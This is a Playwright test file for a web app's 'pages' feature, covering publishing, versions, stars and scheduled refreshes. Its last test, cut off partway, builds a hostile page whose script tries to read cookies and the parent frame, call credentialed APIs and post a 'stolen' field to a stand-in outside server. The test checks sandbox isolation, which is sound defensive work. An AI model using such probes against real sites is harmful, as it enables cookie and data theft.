import { execFile } from "node:child_process";
import { existsSync } from "node:fs";
import { once } from "node:events";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { createServer, type IncomingMessage, type ServerResponse } from "node:http";
import { tmpdir } from "node:os";
import path from "node:path";
import { promisify } from "node:util";
import { expect, test, type Frame, type Page } from "@playwright/test";
import { createActionCatalogue } from "@jskit-ai/kernel/server/actions";
import { createVibe64ActionPolicy, registerVibe64ActionContext } from "@local/vibe64-core/server/actionContext";
import { runWithProjectRequestContext } from "@local/vibe64-core/server/projectRequestContext";
import { createPagesActions } from "../../packages/vibe64-pages/src/server/pagesActions.js";
import { registerRoutes } from "../../packages/vibe64-pages/src/server/registerRoutes.js";
import { createPagesService } from "../../packages/vibe64-pages/src/server/service.js";
import { createAgentPagesCommandService, prepareAgentPagesCommand } from "../../packages/vibe64-terminals/src/server/agentPagesCommand.js";
import { prepareAgentHelperCommand } from "../../packages/vibe64-terminals/src/server/agentHelperCommand.js";
import { assistantStatusServer, relayConversation } from "./support/assistant-status-server";
import { mockDirectChatSession } from "./support/base-shell-mocks";
import { BASE_URL, DASHBOARD_PATH, WORKSPACE_SLUG, directChatSessionId, directChatSessionPayload } from "./support/base-shell-data";
import { fulfillJson, routeApiEndpoint } from "./support/base-shell/http";

const run = promisify(execFile);
const SESSION_ID = "pages-session";
const quietLogger = { debug() {}, info() {}, warn() {}, error() {} };

async function readBody(request: IncomingMessage) {
  const chunks: Buffer[] = [];
  for await (const chunk of request) chunks.push(chunk as Buffer);
  return Buffer.concat(chunks);
}

function nodeReply(response: ServerResponse) {
  let status = 200;
  const headers: Record<string, string> = {};
  const reply = {
    code(value: number) { status = value; return reply; },
    headers(values: Record<string, string>) {
      for (const [name, value] of Object.entries(values)) headers[name.toLowerCase()] = String(value);
      return reply;
    },
    send(payload: unknown) {
      if (response.writableEnded) return reply;
      const raw = typeof payload === "string" || Buffer.isBuffer(payload);
      headers["content-type"] ||= raw ? "text/plain; charset=utf-8" : "application/json; charset=utf-8";
      response.writeHead(status, headers);
      response.end(raw ? payload : JSON.stringify(payload ?? null));
      return reply;
    }
  };
  return reply;
}

// A Vibe64 origin whose page routes are the real ones, over real HTTP with
// their real headers; everything else reaches the Playwright server. Pages are
// published by the real agent command, as an AI would, and refresh from the
// project's saved Git commit.
async function pagesWorld(frontend: string) {
  const root = await mkdtemp(path.join(tmpdir(), "vibe64-pages-browser-"));
  const projectRuntimeRoot = path.join(root, "state", "projects", WORKSPACE_SLUG);
  const projectsRoot = path.join(root, "projects");
  const projectRoot = path.join(projectsRoot, WORKSPACE_SLUG);
  const work = path.join(root, "work");
  const wrapperHostDir = path.join(root, "wrappers");
  for (const folder of [projectRuntimeRoot, projectRoot, work, wrapperHostDir]) await mkdir(folder, { recursive: true });
  const git = (...args: string[]) => run("git", ["-C", projectRoot, "-c", "user.name=Test", "-c", "user.email=test@example.invalid", ...args]);
  await git("init", "--quiet", "--initial-branch=main");
  await writeFile(path.join(projectRoot, "numbers.txt"), "4\n5\n6\n");
  await git("add", "numbers.txt");
  await git("commit", "--quiet", "-m", "Numbers");
  const project = {
    readCurrentProject: async () => ({
      slug: WORKSPACE_SLUG, projectRoot, repositoryMode: "local_source", sourceRoot: projectRoot, repository: { defaultBranch: "main" }
    }),
    runInProjectContext: (slug: string, operation: () => Promise<unknown>) => runWithProjectRequestContext({ slug, projectRuntimeRoot }, operation),
    listProjects: async () => ({ projects: [{ slug: WORKSPACE_SLUG }] }),
    createSessionStore: async () => ({
      readConversationTail: async () => [{ user: { text: "Make me a page" }, metadata: { actorId: "alice", actorDisplayName: "Alice Example" } }]
    })
  };
  const pages = createPagesService({ now: () => new Date().toISOString(), clock: Date.now, project, logger: quietLogger });
  const inProject = <T>(operation: () => Promise<T>) => runWithProjectRequestContext({ projectRuntimeRoot, slug: WORKSPACE_SLUG }, operation);
  const member = { username: "alice", displayName: "Alice Example", role: "owner" };
  const projectContext = {
    projectsRoot,
    currentPracticeProjectScope: () => null,
    readWorkspaceProject: async ({ slug }: { slug: string }) => ({ project: { path: path.join(projectsRoot, slug), projectRuntimeRoot }, projectsRoot })
  };
  const actions = createActionCatalogue({ policy: createVibe64ActionPolicy({ localhostCheckBypassed: true }) });
  actions.register({ contributorId: "pages", domain: "pages", actions: createPagesActions({ pages })
    .map((action) => ({ channels: ["api"], surfaces: ["app"], ...action })) });
  registerVibe64ActionContext(actions, { projectContext, resolveUser: async () => member, authorizeProject: async () => {} });
  const routes: { method: string; pattern: RegExp; handler: (request: unknown, reply: unknown) => Promise<unknown> }[] = [];
  registerRoutes({ router: { register(method: string, routePath: string, _options: unknown, handler) {
    const pattern = routePath.replace(/:([A-Za-z]+)/gu, "(?<$1>[^/]+)").replace(/\/\*$/u, "/(?<wildcard>.*)");
    routes.push({ method, pattern: new RegExp(`^${pattern}$`, "u"), handler });
  } } }, { localhostCheckBypassed: true, projectContext, pages });

  const fileRequests: { path: string; cookie: string }[] = [];
  const server = createServer(async (request, response) => {
    const url = new URL(request.url!, "http://127.0.0.1");
    try {
      const route = routes.find((entry) => entry.method === request.method && entry.pattern.test(url.pathname));
      const body = await readBody(request);
      if (!route) {
        const upstream = await fetch(new URL(`${url.pathname}${url.search}`, frontend), {
          method: request.method,
          headers: Object.fromEntries(["content-type", "cookie", "x-csrf-token", "accept"]
            .filter((name) => request.headers[name]).map((name) => [name, String(request.headers[name])])),
          ...(["GET", "HEAD"].includes(request.method!) ? {} : { body })
        });
        response.writeHead(upstream.status, { "content-type": upstream.headers.get("content-type") || "text/plain" });
        response.end(Buffer.from(await upstream.arrayBuffer()));
        return;
      }
      if (url.pathname.startsWith("/api/vibe64/pages/files/")) fileRequests.push({ path: url.pathname, cookie: String(request.headers.cookie || "") });
      const params = Object.fromEntries(Object.entries(url.pathname.match(route.pattern)!.groups || {})
        .map(([name, value]) => [name === "wildcard" ? "*" : name, decodeURIComponent(value)]));
      const json = body.length ? JSON.parse(body.toString()) : {};
      const fake: Record<string, unknown> = {
        params, headers: request.headers, protocol: "http", body: json, input: { body: json }, vibe64User: member, raw: request,
        executeAction: ({ actionId, input }) => actions.execute({ actionId, input, context: { channel: "api", surface: "app", requestMeta: { request: fake } } })
      };
      await route.handler(fake, nodeReply(response));
    } catch (error) {
      const failure = error as { statusCode?: number; status?: number; code?: string; message?: string };
      if (!response.writableEnded) {
        response.writeHead(failure.statusCode || failure.status || 500, { "content-type": "application/json" });
        response.end(JSON.stringify({ ok: false, error: failure.message, code: failure.code }));
      }
    }
  });
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  const origin = `http://127.0.0.1:${(server.address() as { port: number }).port}`;

  // The agent's own command, as a session's AI runs it.
  const commandService = createAgentPagesCommandService({ logger: quietLogger, project, readPages: () => pages });
  const prepared = await prepareAgentPagesCommand({ commandService, sessionId: SESSION_ID, wrapperHostDir });
  await prepareAgentHelperCommand({ wrapperHostDir, env: process.env });
  async function pagesCommand(...args: string[]) {
    const { stdout } = await run(path.join(wrapperHostDir, "vibe64-helper"), ["pages", ...args], { cwd: work, env: { ...process.env, ...prepared.env } });
    return stdout;
  }
  async function writePage(folder: string, files: Record<string, string>) {
    for (const [name, content] of Object.entries(files)) {
      await mkdir(path.dirname(path.join(work, folder, name)), { recursive: true });
      await writeFile(path.join(work, folder, name), content);
    }
  }
  async function publish(source: string) {
    const output = await pagesCommand("publish", source);
    const link = output.split("\n")[0];
    return { link, pageId: link.split("/").at(-1)! };
  }
  return {
    origin, pages, inProject, fileRequests, pagesCommand, writePage, publish,
    pageFolder: (pageId: string) => path.join(projectRuntimeRoot, "pages", pageId),
    async close() {
      pages.closeRefreshes();
      await commandService.closeAllForSession(SESSION_ID);
      server.closeAllConnections();
      server.close();
      await rm(root, { force: true, recursive: true });
    }
  };
}

// Somewhere outside Vibe64 that a hostile page would send to: it records every
// request and answers anything, so a request that got out would succeed.
async function outsideRecorder() {
  const hits: string[] = [];
  const server = createServer((request, response) => {
    hits.push(`${request.method} ${request.url}`);
    response.writeHead(200, { "access-control-allow-origin": "*", "content-type": "text/plain" });
    response.end("reached");
  });
  server.on("upgrade", (request, socket) => { hits.push(`UPGRADE ${request.url}`); socket.destroy(); });
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  return {
    hits, url: `http://127.0.0.1:${(server.address() as { port: number }).port}`,
    close: () => { server.closeAllConnections(); server.close(); }
  };
}

async function openSessionShell(page: Page) {
  await mockDirectChatSession(page);
  for (const [endpoint, payload] of [
    ["/vibe64/settings", { ok: true, promptHints: { enabled: false } }],
    ["/vibe64/sessions/current", { ok: true, sessionId: directChatSessionId }],
    [`/vibe64/sessions/${directChatSessionId}/agent-session`, { ok: true }],
    [`/vibe64/sessions/${directChatSessionId}/presence`, { ok: true }],
    [`/vibe64/sessions/${directChatSessionId}/assistant-access`, { ok: true, available: true, canUse: true, ownerOnly: false }],
    [`/vibe64/sessions/${directChatSessionId}/message-suggestions`, { ok: true, suggestions: [], canManage: true }],
    [`/vibe64/sessions/${directChatSessionId}/work`, { ok: true, unsaved: false, operation: null, updateOperation: null }],
    [`/vibe64/sessions/${directChatSessionId}/updates/check`, { ok: true, updateAvailable: false, status: "up-to-date" }],
    [`/vibe64/sessions/${directChatSessionId}/renewal`, { ok: true, renewal: null, viewerScope: "pages-test-owner" }],
    [`/vibe64/sessions/${directChatSessionId}/source-editor/stars`, { ok: true, files: [] }]
  ] as const) await routeApiEndpoint(page, endpoint, (route) => fulfillJson(route, payload));
  const conversation = await assistantStatusServer({ session: directChatSessionPayload });
  await relayConversation(page, conversation);
  return conversation;
}

const pageFrame = (page: Page) => page.frameLocator('[data-test="page-viewer-frame"]').frameLocator("iframe");

function filesFrame(page: Page, pageToken = ""): Frame | undefined {
  return page.frames().find((frame) => /\/api\/vibe64\/pages\/files\/[^/]+\/index\.html$/u.test(frame.url()) && frame.url().includes(pageToken));
}

const SUMMARY = (version: string, javascriptFiles: number) => ({
  "index.html": `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Project summary</title>
<link rel="stylesheet" href="_vibe64/page.css"><link rel="stylesheet" href="css/summary.css"></head>
<body><main><h1>Project summary</h1><p id="version">${version}</p><ul id="files"></ul><img id="logo" src="logo.svg" alt="Logo"></main>
<script src="js/summary.js"></script></body></html>`,
  "css/summary.css": "#files { list-style: square; }",
  "js/summary.js": `fetch("data.json").then((answer) => answer.json()).then((rows) => {
  document.getElementById("files").innerHTML = rows.map(([type, count]) => "<li>" + type + ": " + count + "</li>").join("");
  document.body.dataset.loaded = "yes";
});`,
  "data.json": JSON.stringify([["JavaScript", javascriptFiles], ["Vue", 17]]),
  "logo.svg": '<svg xmlns="http://www.w3.org/2000/svg" width="8" height="8"><rect width="8" height="8" fill="#1867c0"/></svg>'
});

// A page that keeps itself up to date: its layout reads data.json, and its
// refresh scripts are what an AI writes beside it.
const OPEN_ISSUES = {
  "index.html": `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Open issues</title>
<link rel="stylesheet" href="_vibe64/page.css"></head>
<body><main><h1>Open issues</h1><p id="total"></p></main><script src="issues.js"></script></body></html>`,
  "issues.js": `fetch("data.json").then((answer) => answer.json()).then(({ total }) => {
  document.getElementById("total").textContent = "Total: " + total;
});`,
  "data.json": JSON.stringify({ total: 0 })
};
const REFRESH_SCRIPTS = {
  "count.mjs": `import { readFileSync, writeFileSync } from "node:fs";
const numbers = readFileSync("numbers.txt", "utf8").trim().split("\\n").map(Number);
writeFileSync(process.env.VIBE64_PAGE_DATA, JSON.stringify({ total: numbers.reduce((sum, value) => sum + value, 0) }));
console.log("Counted " + numbers.length + " numbers");
`,
  "broken.mjs": `console.error("The issue tracker did not answer.");
process.exit(1);
`,
  "slow.mjs": "setTimeout(() => {}, 60_000);\n"
};

test.describe("Vibe64 pages", () => {
  test.describe.configure({ timeout: 120_000 });
  let world: Awaited<ReturnType<typeof pagesWorld>>;
  let conversation: Awaited<ReturnType<typeof assistantStatusServer>> | null = null;
  let errors: string[];

  test.beforeEach(async ({ page }) => {
    await page.setViewportSize({ width: 1280, height: 900 });
    errors = [];
    page.on("pageerror", (error) => errors.push(error.message));
    world = await pagesWorld(BASE_URL);
    conversation = await openSessionShell(page);
  });

  test.afterEach(async () => {
    try {
      expect(errors).toEqual([]);
    } finally {
      await conversation?.close();
      conversation = null;
      await world.close();
    }
  });

  test("a page the AI published shows as a chat card, opens beside the chat and in a new tab, keeps versions, and archives, restores and deletes", async ({ page }, testInfo) => {
    await world.writePage("summary", SUMMARY("First version", 42));
    const summary = await world.publish("summary");
    await world.writePage(".", { "results.html": "<!doctype html><title>Test results</title><h1>All 12 tests pass</h1>" });
    const results = await world.publish("results.html");
    expect(summary.link).toBe(`/app/project/${WORKSPACE_SLUG}/dashboard/pages/${summary.pageId}`);
    conversation!.state.conversationLog = [{
      turnId: "000001",
      user: { role: "user", at: "2026-11-06T09:00:00Z", text: "Make me a page summarising this project's structure that my colleague can open" },
      assistant: { role: "assistant", at: "2026-11-06T09:01:00Z", text: `Here it is: [Project summary](${summary.link})` }
    }, {
      turnId: "000002",
      user: { role: "user", at: "2026-11-06T09:02:00Z", text: `And the results are at ${world.origin}${results.link}` }
    }];

    await page.goto(`${world.origin}${DASHBOARD_PATH}/pages`);
    const cards = page.locator('[data-test="page-link-card"]');
    await expect(cards).toHaveCount(2);
    await expect(cards.nth(0)).toContainText("Project summary");
    await expect(cards.nth(0)).toContainText("Updated");
    await expect(cards.nth(1)).toContainText("Test results");
    const list = page.locator('[data-test="pages-list"]');
    await expect(list.locator("tbody tr")).toHaveCount(2);
    const summaryRow = list.locator(`tr[data-page-id="${summary.pageId}"]`);
    await expect(summaryRow).toContainText("Alice Example");
    await expect(summaryRow.locator('[title="This page has no refresh schedule"]')).toHaveText("—");
    await page.screenshot({ path: testInfo.outputPath("chat-cards-and-list.png") });

    await cards.nth(0).locator('[data-test="page-link-card-open"]').click();
    await expect(page).toHaveURL(new RegExp(`${summary.link}$`, "u"));
    await expect(page.locator('[data-test="page-viewer-title"]')).toHaveText("Project summary");
    await expect(page.locator(".vibe64-page-viewer__meta")).toContainText("Version 1");
    await expect(pageFrame(page).locator("#files li")).toHaveText(["JavaScript: 42", "Vue: 17"]);
    await expect(pageFrame(page).locator("#version")).toHaveText("First version");
    const frame = filesFrame(page)!;
    expect(await frame.evaluate(() => ({
      primary: getComputedStyle(document.documentElement).getPropertyValue("--v64-primary").trim(),
      font: getComputedStyle(document.body).fontFamily,
      listStyle: getComputedStyle(document.getElementById("files")!).listStyleType,
      logo: (document.getElementById("logo") as HTMLImageElement).naturalWidth
    }))).toEqual({ primary: "#1867c0", font: expect.stringContaining("Roboto"), listStyle: "square", logo: 8 });
    await expect(page.locator(".assistant-transcript").first()).toBeVisible();
    await page.screenshot({ path: testInfo.outputPath("page-beside-chat.png") });

    const [tab] = await Promise.all([page.context().waitForEvent("page"), page.locator('[data-test="page-open-new-tab"]').click()]);
    await tab.waitForURL(/\/api\/vibe64\/pages\/view\/[A-Za-z0-9_-]{43}$/u);
    await expect(tab.frameLocator("iframe").locator("#files li")).toHaveText(["JavaScript: 42", "Vue: 17"]);
    expect(await tab.evaluate(() => window.opener)).toBeNull();
    await tab.screenshot({ path: testInfo.outputPath("page-new-tab.png") });
    await tab.close();

    await world.writePage("summary", SUMMARY("Second version", 43));
    expect(await world.pagesCommand("update", summary.pageId, "summary")).toContain("is now at version 2.");
    await page.getByRole("button", { name: "Reload page" }).click();
    await expect(page.locator(".vibe64-page-viewer__meta")).toContainText("Version 2");
    await expect(pageFrame(page).locator("#version")).toHaveText("Second version");
    await page.locator('[data-test="page-versions"]').click();
    await page.locator('[data-test="page-version-restore-1"]').click();
    await expect(page.locator(".vibe64-page-viewer__meta")).toContainText("Version 3");
    await expect(pageFrame(page).locator("#version")).toHaveText("First version");
    await expect(pageFrame(page).locator("#files li").first()).toHaveText("JavaScript: 42");
    await page.locator('[data-test="page-versions"]').click();
    const versionList = page.locator(".v-overlay--active .v-list");
    await expect(versionList.getByText("Version 3, back from 1 (shown)")).toBeVisible();
    await expect(versionList.getByText("Version 2", { exact: true })).toBeVisible();
    await expect(versionList.getByText("Version 1", { exact: true })).toBeVisible();
    await expect(page.locator(".v-overlay--active .v-overlay__content")).toHaveCSS("opacity", "1");
    await page.screenshot({ path: testInfo.outputPath("page-versions.png") });
    await page.keyboard.press("Escape");

    await page.locator("[data-testid=jskit-shell-back]").click();
    await expect(page).toHaveURL(new RegExp(`${DASHBOARD_PATH}/pages$`, "u"));
    const current = page.locator('[data-test="pages-tab-current"]');
    const archived = page.locator('[data-test="pages-tab-archived"]');
    await expect(list.getByRole("button", { name: "Delete" })).toHaveCount(0);
    await summaryRow.getByRole("button", { name: "Archive" }).click();
    await expect(current).toHaveText("Current (1)");
    await expect(archived).toHaveText("Archived (1)");
    await archived.click();
    await expect(list.locator("tbody tr")).toHaveCount(1);
    await expect(summaryRow.getByRole("button", { name: "Delete" })).toBeVisible();
    await page.screenshot({ path: testInfo.outputPath("pages-archived.png") });
    await summaryRow.getByRole("button", { name: "Restore" }).click();
    await expect(archived).toHaveText("Archived (0)");
    await current.click();
    await expect(list.locator("tbody tr")).toHaveCount(2);
    await summaryRow.getByRole("button", { name: "Archive" }).click();
    await archived.click();
    await summaryRow.getByRole("button", { name: "Delete" }).click();
    await expect(page.getByRole("dialog")).toContainText("Project summary");
    await page.locator('[data-test="pages-delete-confirm"]').click();
    await expect(archived).toHaveText("Archived (0)");
    await expect(page.locator('[data-test="pages-empty"]')).toHaveText("No archived pages.");
    expect(existsSync(world.pageFolder(summary.pageId))).toBe(false);
    expect(existsSync(world.pageFolder(results.pageId))).toBe(true);

    await page.reload();
    await expect(cards).toHaveCount(2);
    await expect(cards.nth(0)).toContainText("This page no longer exists.");
    await expect(cards.nth(0).locator('[data-test="page-link-card-open"]')).toBeDisabled();
    await expect(cards.nth(1)).toContainText("Test results");
  });

  for (const width of [390, 1280]) {
    test(`a page starred from its chat card opens at once from the chat's Starred menu, comes first in the Pages list and leaves the stars while archived at ${width}px`, async ({ page }, testInfo) => {
      await page.setViewportSize({ width, height: 900 });
      await world.writePage("summary", SUMMARY("First version", 42));
      const summary = await world.publish("summary");
      await world.writePage(".", { "results.html": "<!doctype html><title>Test results</title><h1>All 12 tests pass</h1>" });
      const results = await world.publish("results.html");
      conversation!.state.conversationLog = [{
        turnId: "000001",
        user: { role: "user", at: "2026-11-06T09:00:00Z", text: "Make me a page summarising this project" },
        assistant: { role: "assistant", at: "2026-11-06T09:01:00Z", text: `Here it is: [Project summary](${summary.link})` }
      }];
      const viewRequests: string[] = [];
      page.on("request", (request) => {
        if (request.method() === "POST" && /\/pages\/[^/]+\/view$/u.test(new URL(request.url()).pathname)) viewRequests.push(request.url());
      });

      await page.goto(`${world.origin}${DASHBOARD_PATH}`);
      const showChat = page.getByRole("button", { name: "Show chat", exact: true });
      if (await showChat.isVisible()) await showChat.click();
      const card = page.locator('[data-test="page-link-card"]');
      await expect(card).toContainText("Project summary");
      await card.getByRole("button", { name: "Star page", exact: true }).click();
      await expect(card.getByRole("button", { name: "Unstar page", exact: true })).toHaveAttribute("aria-pressed", "true");
      await expect.poll(async () => (await world.inProject(() => world.pages.starredPages({ vibe64User: { username: "alice" } }))).pages
        .map((entry) => entry.id)).toEqual([summary.pageId]);

      await page.getByRole("button", { name: "Starred (1)", exact: true }).click();
      const menu = page.getByRole("dialog", { name: "Starred", exact: true });
      await expect(menu.getByRole("textbox", { name: "Find a starred page or file", exact: true })).toBeFocused();
      const starredPages = menu.getByRole("list", { name: "Starred pages", exact: true });
      const starredSummary = starredPages.locator('[data-test="starred-page-open"]', { hasText: "Project summary" });
      await expect(starredSummary).toBeVisible();
      await expect(menu.getByText("Star files in Files to keep them handy while chatting.")).toBeVisible();
      await menu.getByRole("textbox", { name: "Find a starred page or file", exact: true }).fill("nothing like it");
      await expect(menu.getByText("No matching starred pages.")).toBeVisible();
      await menu.getByRole("textbox", { name: "Find a starred page or file", exact: true }).fill("summ");
      await expect.poll(() => viewRequests.length, { message: "the menu asks for the link as it opens" }).toBe(1);
      await page.screenshot({ path: testInfo.outputPath(`starred-menu-${width}.png`) });
      await starredSummary.click();
      await expect(page).toHaveURL(new RegExp(`${summary.link}$`, "u"));
      await expect(page.locator('[data-test="page-viewer-title"]')).toHaveText("Project summary");
      await expect(pageFrame(page).locator("#version")).toHaveText("First version");
      expect(viewRequests, "opening the page used the link asked for ahead").toHaveLength(1);
      await expect(page.locator('[data-test="page-viewer"]').getByRole("button", { name: "Unstar page", exact: true })).toBeVisible();
      await page.screenshot({ path: testInfo.outputPath(`starred-page-open-${width}.png`) });
      // A card's Open brings its page forward too, on a phone from behind the chat.
      if (await showChat.isVisible()) await showChat.click();
      await card.locator('[data-test="page-link-card-open"]').click();
      await expect(page.locator('[data-test="page-viewer-title"]')).toBeVisible();

      await page.goto(`${world.origin}${DASHBOARD_PATH}/pages`);
      // A phone opens a Dashboard link with the chat in front.
      if (width < 600) await page.getByRole("button", { name: "Show project", exact: true }).click();
      const rows = page.locator('[data-test="pages-list"] tbody tr');
      await expect(rows).toHaveCount(2);
      await expect(rows.nth(0)).toHaveAttribute("data-page-id", summary.pageId);
      await expect(rows.nth(0).getByRole("button", { name: "Unstar page", exact: true })).toBeVisible();
      await expect(rows.nth(1)).toHaveAttribute("data-page-id", results.pageId);
      await rows.nth(1).getByRole("button", { name: "Star page", exact: true }).click();
      await expect(rows.nth(1).getByRole("button", { name: "Unstar page", exact: true })).toBeVisible();
      await page.screenshot({ path: testInfo.outputPath(`pages-list-stars-${width}.png`) });
      await rows.filter({ hasText: "Project summary" }).getByRole("button", { name: "Archive" }).click();
      await expect(rows).toHaveCount(1);
      await expect(rows.nth(0).getByRole("button", { name: "Unstar page", exact: true })).toBeVisible();
      if (await showChat.isVisible()) await showChat.click();
      await page.getByRole("button", { name: "Starred (1)", exact: true }).click();
      await expect(starredPages.locator('[data-test="starred-page-open"]')).toHaveText([/Test results/u]);
      expect(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth)).toBe(true);
    });
  }

  for (const width of [390, 1280]) {
    test(`a page that keeps itself up to date shows its refresh in the Pages list and beside the chat, keeps its last good version when a refresh fails, and its refreshes run, pause, resume, cancel and stop while archived at ${width}px`, async ({ page }, testInfo) => {
      await page.setViewportSize({ width, height: 900 });
      await world.writePage("issues", OPEN_ISSUES);
      await world.writePage(".", REFRESH_SCRIPTS);
      const issues = await world.publish("issues");
      const setRefresh = (script: string) => world.pagesCommand("refresh", issues.pageId, "--every", "30m", "--command", script);
      expect(await setRefresh("count.mjs"))
        .toContain(`Page ${issues.pageId} now refreshes every 30 minutes by running count.mjs on Vibe64's server, as Alice Example.`);
      const version = async () => (await world.inProject(() => world.pages.readPage({ pageId: issues.pageId }))).page.version;

      await page.goto(`${world.origin}${DASHBOARD_PATH}/pages`);
      // A phone opens a Dashboard link with the chat in front.
      if (width < 600) await page.getByRole("button", { name: "Show project", exact: true }).click();
      const cell = page.locator(`[data-test="pages-list"] tr[data-page-id="${issues.pageId}"] [data-test="page-refresh"]`);
      const state = cell.locator('[data-test="page-refresh-state"]');
      const button = (name: string) => cell.getByRole("button", { name, exact: true });
      const log = page.locator('[data-test="page-refresh-log"]');
      const runs = log.locator('[data-test="page-refresh-run"]');
      await expect(cell).toContainText("Every 30 minutes");
      await expect(state).toHaveText(/^Next /u);
      // While a refresh runs, the list looks again every 5 s on its own timer. The
      // page clock, installed once the page has loaded, moves those looks along.
      await page.clock.install();
      const listShows = (expectation: () => Promise<void>) => expect(async () => {
        await page.clock.fastForward(5_000);
        await expectation();
      }).toPass({ intervals: [100], timeout: 15_000 });

      await button("Refresh now").click();
      await expect.poll(version, { timeout: 15_000 }).toBe(2);
      await listShows(() => expect(button("Refresh now")).toBeVisible({ timeout: 1_000 }));
      await button("Log").click();
      await expect(log).toContainText("Every 30 minutes · a script, no AI · runs as Alice Example");
      await expect(runs).toHaveCount(1);
      await expect(runs.first()).toContainText("Refreshed: version 2.");
      await expect(runs.first().locator('[data-test="page-refresh-run-log"]')).toContainText("Counted 3 numbers");
      await page.screenshot({ path: testInfo.outputPath(`refresh-log-${width}.png`) });
      await log.getByRole("button", { name: "Close", exact: true }).click();

      // A refresh that fails keeps the page as it was and says so, with its log.
      expect(await setRefresh("broken.mjs")).toContain("by running broken.mjs");
      await page.getByRole("button", { name: "Refresh pages", exact: true }).click();
      await button("Refresh now").click();
      await listShows(() => expect(state).toHaveText(/^Refresh failed /u, { timeout: 1_000 }));
      await expect(state).toHaveClass(/vibe64-pages-list__refresh-alert/u);
      expect(await version()).toBe(2);
      await page.screenshot({ path: testInfo.outputPath(`refresh-failed-${width}.png`) });
      await button("Log").click();
      await expect(runs).toHaveCount(2);
      await expect(runs.first()).toContainText("The refresh script stopped with exit status 1.");
      await expect(runs.first().locator('[data-test="page-refresh-run-log"]')).toContainText("The issue tracker did not answer.");
      await log.getByRole("button", { name: "Close", exact: true }).click();

      await button("Pause").click();
      await expect(state).toHaveText("Paused: Paused by Alice Example.");
      await button("Resume").click();
      await expect(state).toHaveText(/^Refresh failed /u);

      // A running refresh can always be cancelled.
      expect(await setRefresh("slow.mjs")).toContain("by running slow.mjs");
      await page.getByRole("button", { name: "Refresh pages", exact: true }).click();
      await button("Refresh now").click();
      await expect(state).toHaveText("Refreshing…");
      await expect(button("Cancel")).toBeEnabled();
      await page.screenshot({ path: testInfo.outputPath(`refresh-running-${width}.png`) });
      await button("Cancel").click();
      await listShows(() => expect(button("Refresh now")).toBeVisible({ timeout: 1_000 }));
      await button("Log").click();
      await expect(runs.first()).toContainText("The refresh was cancelled.");
      await log.getByRole("button", { name: "Close", exact: true }).click();
      expect(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth)).toBe(true);

      // Beside the chat the page shows the refreshed data and how its refresh stands.
      await page.locator(`[data-test="pages-list"] tr[data-page-id="${issues.pageId}"]`).getByRole("button", { name: "Open", exact: true }).click();
      const line = page.locator('[data-test="page-viewer-refresh"]');
      await expect(line).toContainText("Every 30 minutes");
      await expect(pageFrame(page).locator("#total")).toHaveText("Total: 15");
      await line.getByRole("button", { name: "Log", exact: true }).click();
      await expect(runs).toHaveCount(3);
      await log.getByRole("button", { name: "Close", exact: true }).click();
      await page.screenshot({ path: testInfo.outputPath(`refresh-viewer-${width}.png`) });

      await page.getByRole("link", { name: "All pages" }).click();
      if (width < 600 && await page.getByRole("button", { name: "Show project", exact: true }).isVisible()) {
        await page.getByRole("button", { name: "Show project", exact: true }).click();
      }
      await page.locator(`[data-test="pages-list"] tr[data-page-id="${issues.pageId}"]`).getByRole("button", { name: "Archive", exact: true }).click();
      await page.locator('[data-test="pages-tab-archived"]').click();
      await expect(state).toHaveText("Stopped while archived");
      await expect(button("Refresh now")).toHaveCount(0);
    });
  }

  test("a hostile page reads no cookie, reaches neither Vibe64 nor anywhere else, and sees no other page, beside the chat or in its own tab", async ({ page, context }, testInfo) => {
    const outside = await outsideRecorder();
    try {
      await world.writePage(".", { "other.html": "<!doctype html><title>Other page</title><p>Other page secret</p>" });
      const other = await world.publish("other.html");
      const otherToken = (await world.inProject(() => world.pages.openPageView({ pageId: other.pageId }))).viewPath.split("/").at(-1);
      const config = {
        api: `/api/app/${WORKSPACE_SLUG}/vibe64/pages?from=hostile`,
        session: "/api/session?from=hostile",
        origin: world.origin,
        vibe64: `${BASE_URL}/api/health?from=hostile`,
        outside: outside.url,
        outsideWs: outside.url.replace("http", "ws"),
        otherPage: `/api/vibe64/pages/files/${otherToken}/index.html`,
        otherToken
      };
      await world.writePage("hostile", {
        "index.html": `<!doctype html><html><head><meta charset="utf-8"><title>Harmless chart</title></head><body>
<script type="application/json" id="config">${JSON.stringify(config)}</script>
<pre id="results"></pre><form id="escape" method="post" action="${outside.url}/form"><input name="stolen" value="x"></form>
<script src="hostile.js"></script></body></html>`,
        "data.json": "{\"own\":true}",
        "hostile.js": `
const config = JSON.parse(document.getElementById("config").textContent);
const results = {};
const violations = [];
document.addEventListener("securitypolicyviolation", (event) => violations.push(event.effectiveDirective + " " + event.blockedURI));
async function attempt(name, operation) {
  try { results[name] = { reached: true, value: String(await operation()).slice(0, 120) }; }
  catch (error) { results[name] = { reached: false, error: String(error && error.name || error) }; }
}
function load(tag, url) {
  return new Promise((resolve, reject) => {
    const element = document.createElement(tag);
    element.onload = () => resolve("loaded");
    element.onerror = () => reject(new Error(tag + "-error"));
    setTimeout(() => reject(new Error(tag + "-timeout")), 3000);
    if (tag === "link") { element.rel = "stylesheet"; element.href = url; } else element.src = url;
    document.head.append(element);
  });
}
function opened(open) {
  return new Promise((resolve, reject) => {
    const channel = open();
    channel.onopen = () => resolve("open");
    channel.onerror = () => { channel.close(); reject(new Error("channel-error")); };
    setTimeout(() => reject(new Error("channel-timeout")), 3000);
  });
}
(async () => {
  await attempt("cookie", () => document.cookie);
  await attempt("localStorage", () => localStorage.length);
  await attempt("parentDocument", () => parent.document.title);
  await attempt("parentCookie", () => parent.document.cookie);
  await attempt("topDocument", () => top.document.title);
  await attempt("topLocation", () => top.location.href);
  await attempt("ownFile", () => fetch("data.json").then((answer) => answer.text()));
  await attempt("vibe64Api", () => fetch(config.api, { credentials: "include" }).then((answer) => answer.status));
  await attempt("vibe64ApiAbsolute", () => fetch(config.origin + config.api, { credentials: "include" }).then((answer) => answer.status));
  await attempt("vibe64Session", () => fetch(config.session, { credentials: "include" }).then((answer) => answer.status));
  await attempt("vibe64OtherPort", () => fetch(config.vibe64).then((answer) => answer.status));
  await attempt("otherPageFile", () => fetch(config.otherPage).then((answer) => answer.text()));
